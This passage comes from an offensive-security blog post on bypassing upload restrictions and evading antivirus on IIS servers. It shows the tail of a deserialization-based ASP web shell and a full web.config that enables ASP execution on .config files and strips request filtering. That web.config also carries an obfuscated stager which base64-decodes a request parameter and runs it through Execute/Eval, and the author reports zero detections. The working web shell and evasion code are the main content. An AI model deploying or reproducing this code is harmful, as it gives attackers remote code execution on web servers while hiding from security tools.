+<span class="k">Set</span> <span class="n">d</span> <span class="o">=</span> <span class="n">fmt</span><span class="p">.</span><span class="n">Deserialize_2</span><span class="p">(</span><span class="n">Base64ToStream</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
+<span class="k">Set</span> <span class="n">o</span> <span class="o">=</span> <span class="n">d</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">(</span><span class="n">al</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()).</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">entry_class</span><span class="p">)</span>
+
+<span class="k">End</span> <span class="k">Sub</span>
+
+<span class="n">SetVersion</span>
+<span class="k">On</span> <span class="k">Error</span> <span class="k">Resume</span> <span class="k">Next</span>
+<span class="n">Run</span>
+<span class="k">If</span> <span class="n">Err</span><span class="p">.</span><span class="n">Number</span> <span class="o">&lt;&gt;</span> <span class="mi">0</span> <span class="k">Then</span>
+  <span class="n">DebugPrint</span> <span class="n">Err</span><span class="p">.</span><span class="n">Description</span>
+  <span class="n">Err</span><span class="p">.</span><span class="n">Clear</span>
+<span class="k">End</span> <span class="k">If</span>
+<span class="err">%</span><span class="o">&gt;</span>
+<span class="o">-</span><span class="err">–</span><span class="o">&gt;</span>
+</pre></table></code></div></div><p>As expected, after execution the file is created:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-11.png" alt="post02-11" /></p><p>Now, back to process monitor.. if we filter only “Process Create” operations and run our web shell again, we get 0 results:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-12.png" alt="post02-12" /></p><p>Now, you may think that we are done.. <strong>but we are not.</strong> (cry face)</p><p>Remember from “Step 2” that some AVs may create detection based on the usage and pattern of known malicious files and scripts?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-13.png" alt="post02-13" /></p><p>We could try to apply what I’ve showed so far, but let’s learn another useful technique to avoid detection.</p><h3 id="can-you-pls-execute-my-code-sir">Can you pls execute my code sir?</h3><p>Sometimes the best way to avoid detection is to use something that is not malicious at all. Our payload has multiple objects to functions that reveal our intend, from the moment we drop it on disk we give a chance for security solutions to trigger detections and even permit responders to act on it.</p><p>So let’s create something that will serve as a stager for our payload, the easiest way to achieve this is to have enough code to receive and execute our code directly into memory.</p><p>Since we are using classic ASP, we can receive our payload using the “Request()” function, decode it’s Base64 content and execute with a combination of “Execute()” and “Eval()”.</p><div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">"1.0"</span> <span class="n">encoding</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="err">?</span><span class="o">&gt;&lt;</span><span class="n">configuration</span><span class="o">&gt;&lt;</span><span class="n">system</span><span class="p">.</span><span class="n">webServer</span><span class="o">&gt;&lt;</span><span class="n">handlers</span> <span class="n">accessPolicy</span><span class="o">=</span><span class="s">"Read, Script, Write"</span><span class="o">&gt;&lt;</span><span class="n">add</span> <span class="n">name</span><span class="o">=</span><span class="s">"new_policy"</span> <span class="n">path</span><span class="o">=</span><span class="s">"*.config"</span> <span class="n">verb</span><span class="o">=</span><span class="s">"GET,POST"</span> <span class="n">modules</span><span class="o">=</span><span class="s">"IsapiModule"</span> <span class="n">scriptProcessor</span><span class="o">=</span><span class="s">"%windir%\system32\inetsrv\asp.dll"</span> <span class="n">resourceType</span><span class="o">=</span><span class="s">"Unspecified"</span> <span class="n">requireAccess</span><span class="o">=</span><span class="s">"Write"</span> <span class="n">preCondition</span><span class="o">=</span><span class="s">"bitness64"</span> <span class="o">/&gt;&lt;/</span><span class="n">handlers</span><span class="o">&gt;&lt;</span><span class="n">security</span><span class="o">&gt;&lt;</span><span class="n">requestFiltering</span><span class="o">&gt;&lt;</span><span class="n">fileExtensions</span><span class="o">&gt;&lt;</span><span class="n">remove</span> <span class="n">fileExtension</span><span class="o">=</span><span class="s">".config"</span> <span class="o">/&gt;&lt;/</span><span class="n">fileExtensions</span><span class="o">&gt;&lt;</span><span class="n">hiddenSegments</span><span class="o">&gt;&lt;</span><span class="n">remove</span> <span class="n">segment</span><span class="o">=</span><span class="s">"web.config"</span> <span class="o">/&gt;&lt;/</span><span class="n">hiddenSegments</span><span class="o">&gt;&lt;/</span><span class="n">requestFiltering</span><span class="o">&gt;&lt;/</span><span class="n">security</span><span class="o">&gt;&lt;/</span><span class="n">system</span><span class="p">.</span><span class="n">webServer</span><span class="o">&gt;&lt;</span><span class="n">appSettings</span><span class="o">&gt;&lt;/</span><span class="n">appSettings</span><span class="o">&gt;&lt;/</span><span class="n">configuration</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="p">!</span><span class="err">–</span><span class="o">-</span>
+<span class="o">&lt;</span><span class="err">%</span> 
+<span class="k">Dim</span> <span class="nv">mom</span>
+<span class="n">mom</span> <span class="o">=</span> <span class="n">Split</span><span class="p">(</span><span class="s">"a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s"</span><span class="p">,</span><span class="s">","</span><span class="p">)</span>
+
+<span class="k">Private</span> <span class="k">Function</span> <span class="nf">sbts</span><span class="p">(</span><span class="n">Binary</span><span class="p">)</span>
+  <span class="k">Const</span> <span class="nv">adt</span> <span class="o">=</span> <span class="mi">2</span>
+  <span class="k">Const</span> <span class="nv">atdb</span> <span class="o">=</span> <span class="mi">1</span>
+  <span class="k">Dim</span> <span class="nv">bs</span>
+  <span class="k">Set</span> <span class="n">bs</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"ADODB.Stream"</span><span class="p">)</span>
+  <span class="n">bs</span><span class="p">.</span><span class="n">Type</span> <span class="o">=</span> <span class="n">atdb</span>
+  <span class="n">bs</span><span class="p">.</span><span class="n">Open</span>
+  <span class="n">bs</span><span class="p">.</span><span class="n">Write</span> <span class="n">Binary</span>
+  <span class="n">bs</span><span class="p">.</span><span class="n">Position</span> <span class="o">=</span> <span class="mi">0</span>
+  <span class="n">bs</span><span class="p">.</span><span class="n">Type</span> <span class="o">=</span> <span class="n">adt</span>
+  <span class="n">bs</span><span class="p">.</span><span class="n">CharSet</span> <span class="o">=</span> <span class="s">"us-ascii"</span>
+  <span class="n">sbts</span> <span class="o">=</span> <span class="n">bs</span><span class="p">.</span><span class="n">ReadText</span>
+  <span class="k">Set</span> <span class="n">bs</span> <span class="o">=</span> <span class="k">Nothing</span>
+<span class="k">End</span> <span class="k">Function</span>
+
+<span class="k">Function</span> <span class="nf">bd6</span><span class="p">(</span><span class="k">ByVal</span> <span class="n">vCode</span><span class="p">)</span>
+    <span class="k">Dim</span> <span class="nv">oXML</span><span class="p">,</span> <span class="n">oNode</span>
+    <span class="k">Set</span> <span class="n">oXML</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Msxml2.DOMDocument.3.0"</span><span class="p">)</span>
+    <span class="k">Set</span> <span class="n">oNode</span> <span class="o">=</span> <span class="n">oXML</span><span class="p">.</span><span class="n">CreateElement</span><span class="p">(</span><span class="s">"base64"</span><span class="p">)</span>
+    <span class="n">oNode</span><span class="p">.</span><span class="n">dataType</span> <span class="o">=</span> <span class="s">"bin.base64"</span>
+    <span class="n">oNode</span><span class="p">.</span><span class="n">text</span> <span class="o">=</span> <span class="n">vCode</span>
+    <span class="n">bd6</span> <span class="o">=</span> <span class="n">sbts</span><span class="p">(</span><span class="n">oNode</span><span class="p">.</span><span class="n">nodeTypedValue</span><span class="p">)</span>
+    <span class="k">Set</span> <span class="n">oNode</span> <span class="o">=</span> <span class="k">Nothing</span>
+    <span class="k">Set</span> <span class="n">oXML</span> <span class="o">=</span> <span class="k">Nothing</span>
+<span class="k">End</span> <span class="k">Function</span>
+
+<span class="n">dim</span> <span class="n">fg</span> <span class="p">:</span> <span class="n">fg</span> <span class="o">=</span> <span class="s">"Ex"</span><span class="o">+</span><span class="n">mom</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="s">"cute(bd6(Request(</span><span class="se">""</span><span class="s">file</span><span class="se">""</span><span class="s">)))"</span>
+<span class="n">eval</span> <span class="n">fg</span>
+<span class="err">%</span><span class="o">&gt;</span>
+<span class="o">-</span><span class="err">–</span><span class="o">&gt;</span>
+</pre></table></code></div></div><p>And now.. <strong>0</strong> detections.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-14.png" alt="post02-14" /></p><p>We can use any b64 encoded payload we want and get it executed through our web shell stager:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-15.png" alt="post02-15" /></p><p>And that’s it!</p></div><div class="post-tail-wrapper text-muted"><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Bypass Upload Restrictions and Evade Detection - Fgsec&url=https://fgsec.net/posts/Bypass-Upload-Restrictions-and-Evade-Detection/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Bypass Upload Restrictions and Evade Detection - Fgsec&u=https://fgsec.net/posts/Bypass-Upload-Restrictions-and-Evade-Detection/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Bypass Upload Restrictions and Evade Detection - Fgsec&url=https://fgsec.net/posts/Bypass-Upload-Restrictions-and-Evade-Detection/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Dynamically-resolving-syscalls-in-CSharp/">Dynamically resolving syscalls in C#</a><li><a href="/posts/Bypass-Upload-Restrictions-and-Evade-Detection/">Bypass Upload Restrictions and Evade Detection</a><li><a href="/posts/Injecting-dotNet-Assemblies-To-Unmanaged-Processes/">Injecting dotNet Assemblies to Unmanaged Processes</a><li><a href="/posts/From-CSRF-to-RCE/">From CSRF to RCE</a><li><a href="/posts/New-Blog-Again/">New blog again</a></ul></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Dynamically-resolving-syscalls-in-CSharp/"><div class="card-body"> <span class="timeago small" > May 4 <i class="unloaded">2021-05-04T13:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Dynamically resolving syscalls in C#</h3><div class="text-muted small"><p> This post aims to describe and provide example code on how you can dynamically resolve syscalls using only C#. What are System calls? TL;DR: System calls or just syscalls are used by applications...</p></div></div></a></div><div class="card"> <a href="/posts/Injecting-dotNet-Assemblies-To-Unmanaged-Processes/"><div class="card-body"> <span class="timeago small" > Feb 9 <i class="unloaded">2021-02-09T13:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Injecting dotNet Assemblies to Unmanaged Processes</h3><div class="text-muted small"><p> This is a quick post to show how you can inject your .NET assembly code to unmanaged processes. Generate the ShellCode As an example, I will be using a Mythic implant. But feel free to develop yo...</p></div></div></a></div><div class="card"> <a href="/posts/From-CSRF-to-RCE/"><div class="card-body"> <span class="timeago small" > Apr 19, 2020 <i class="unloaded">2020-04-19T13:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>From CSRF to RCE</h3><div class="text-muted small"><p> A few days ago I started taking interest in Bolt, a content management that quoting from its github, is a “Sophisticated, lightweight &amp; simple CMS”. The team behind it really did a great job i...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/From-CSRF-to-RCE/" class="btn btn-outline-primary" prompt="Older"><p>From CSRF to RCE</p></a> <a href="/posts/Injecting-dotNet-Assemblies-To-Unmanaged-Processes/" class="btn btn-outline-primary" prompt="Newer"><p>Injecting dotNet Assemblies to Unmanaged Processes</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/felipegaspar">Felipe Gaspar</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://fgsec.net{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
